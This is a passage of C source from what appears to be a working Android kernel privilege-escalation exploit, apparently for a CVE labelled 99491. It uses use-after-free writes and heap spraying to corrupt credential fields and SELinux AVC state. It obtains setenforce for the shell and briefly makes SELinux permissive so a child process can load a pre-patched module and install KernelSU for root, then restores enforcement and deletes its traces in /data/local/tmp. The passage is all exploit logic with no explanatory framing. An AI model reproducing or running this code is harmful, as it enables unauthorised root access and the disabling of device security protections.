            uint32_t oerr;
            uint32_t fsuid;
        } rb = { 0, 0, 0, 0 };
        uint32_t enf = 0xffffffffu;

        if (write(go, "B", 1) != 1)
            break;
        if (read_full(st, &rb, sizeof(rb)) != 0)
            break;
        printf("[*] avc: round %d open=%u errno=%u fsuid=%u node=%#llx\n",
               round + 1, rb.open_ok, rb.oerr, rb.fsuid,
               (unsigned long long)rb.node);
        if (!rb.open_ok) {
            (void)direct_uaf_write_syn(R + kp.cred_fsuid_off, spray_n, spread_ms);
            spray_drain();
            continue;
        }
        if (!rb.node) {
            printf("[-] avc: no node address\n");
            break;
        }
        for (int t = 0; t < 4 && !avc_ok; t++) {
            (void)direct_uaf_write(rb.node + 28, spray_n, spread_ms);
            spray_drain();
            if (write(go, "R", 1) != 1)
                break;
            if (read_full(st, &enf, sizeof(enf)) != 0)
                break;
            printf("[*] avc: flags retry %d enforce=%u\n", t + 1, enf);
            if (enf == 0)
                avc_ok = 1;
        }
        if (!avc_ok)
            break;
    }
    if (!avc_ok) {
        fprintf(stderr, "[-] avc: setenforce grant failed\n");
        return 1;
    }
    printf("[+] avc: shell setenforce granted\n");

    /* 8. Release the child: it was blocked in read(3) with the shell
     *    domain checked at syscall entry, so this byte is delivered
     *    regardless of later changes.  go.flag then lets it run the KSU
     *    stage. */
    printf("[*] releasing child (flag-gated)\n");
    (void)!write(go, "X", 1);
    {
        int gg = open("/data/local/tmp/go.flag",
                      O_CREAT | O_WRONLY | O_TRUNC, 0644);

        if (gg >= 0) {
            (void)!write(gg, "1", 1);
            close(gg);
        }
    }

    /* 9. The child loads the pre-patched module inside the permissive
     *    window, restores Enforcing, installs ksud and grants root. */
    {
        long dl = now_ms() + 180000;

        while (now_ms() < dl) {
            int kf = open("/data/local/tmp/cve99491.ksu.out", O_RDONLY);

            if (kf >= 0) {
                char kb[4096];
                ssize_t kn = read(kf, kb, sizeof(kb) - 1);

                close(kf);
                if (kn > 0) {
                    kb[kn] = 0;
                    if (strstr(kb, "KSU_DONE"))
                        break;
                }
            }
            usleep(200000);
        }
        printf("[*] ksu stage finished\n");
    }
    usleep(2000000);
    {
        static const char *paths[] = {
            "/data/local/tmp/cve99491.ksu.out",
            "/data/local/tmp/cve99491.out",
            "/data/local/tmp/cve99491.exec.out",
            "/data/local/tmp/cve99491.sh.out"
        };

        for (int k = 0; k < 4; k++) {
            int pf = open(paths[k], O_RDONLY);

            if (pf < 0) {
                printf("[-] no %s\n", paths[k]);
                continue;
            }
            char pb[2048];
            ssize_t pn = read(pf, pb, sizeof(pb) - 1);

            close(pf);
            if (pn > 0) {
                pb[pn] = 0;
                printf("---- %s ----\n%s\n---------------------\n",
                       paths[k], pb);
            }
            unlink(paths[k]);
        }
        unlink("/data/local/tmp/go.flag");
    }
    {
        int status = 0;

        for (int w = 0; w < 30; w++) {
            pid_t r = waitpid(child, &status, WNOHANG);

            if (r == child) {
                printf("[+] child shell exited status=%#x\n", status);
                break;
            }
            usleep(100000);
        }
    }
    spray_release();
    printf("[+] done\n");
    return 0;
}
